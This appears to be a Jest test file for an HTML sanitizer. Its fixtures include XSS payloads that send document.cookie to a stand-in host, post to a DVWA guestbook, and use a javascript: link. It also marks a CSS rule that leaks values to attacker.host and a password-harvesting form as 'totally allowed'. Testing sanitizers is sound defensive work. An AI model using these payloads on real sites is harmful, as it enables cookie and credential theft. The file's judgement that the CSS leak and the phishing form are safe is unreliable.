import { sanitizeHTML } from './sanitizeHTML';

/** scripts that should be totally escaped */
const script = '<script src=""></script>';
const script2 = `<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>`;
const xhrScript = `<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
  xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
  xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
  </script>`;

/* bad schema in allowed attribute */
const javascriptHref = `<a href="javascript:alert(8007)">Click me</a>`;

/* tags with attributes that should be some removed */
const aClick = '<a onClick="() => console.log("hello world")"></a>';
const aClickId =
  '<a id="my-link" onClick="() => console.log("hello world")"></a>';

/* totally allowed and should not be escaped or removed */
const css = `<style>#username[value="mikeg"] {background:url("https://attacker.host/mikeg");}</style><input id="username" value="mikeg" />`;
const goodHTMLInQueryString = `http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<h3>Please login to proceed</h3> <form action="http://192.168.149.128">Username:<input type="username" name="username" /><br />Password:<br /><input type="password" name="password" /><br /><input type="submit" value="Logon" /><br /></form>`;
const goodAnchor = '<a href="helloworld.com">Hello world</a>';

it('should escape script tags and retain child text', () => {
  expect(sanitizeHTML(script)).toBe('&lt;script&gt;&lt;/script&gt;');
  expect(sanitizeHTML(script2)).toBe(
    '&lt;script&gt;new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;&lt;/script&gt;'
  );
  expect(sanitizeHTML(xhrScript)).toBe(
    `&lt;script&gt;
  var xhr = new XMLHttpRequest();
  xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
  xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
  xhr.send('txtName=xss&amp;mtxMessage=xss&amp;btnSign=Sign+Guestbook');
  &lt;/script&gt;`
  );
});

it('should remove non-valid URL schemes in href attributes', () => {
  expect(sanitizeHTML(javascriptHref)).toBe('<a>Click me</a>');
});

it('should prevent bad event handlers in tags', () => {
  expect(sanitizeHTML(aClick)).toBe('<a></a>');
  expect(sanitizeHTML(aClickId)).toBe('<a id="my-link"></a>');
});

it('should allow tags and attributes on allow list', () => {
  expect(sanitizeHTML(css)).toBe(css);
  expect(sanitizeHTML(goodHTMLInQueryString)).toBe(goodHTMLInQueryString);
  expect(sanitizeHTML(goodAnchor)).toBe(goodAnchor);
});
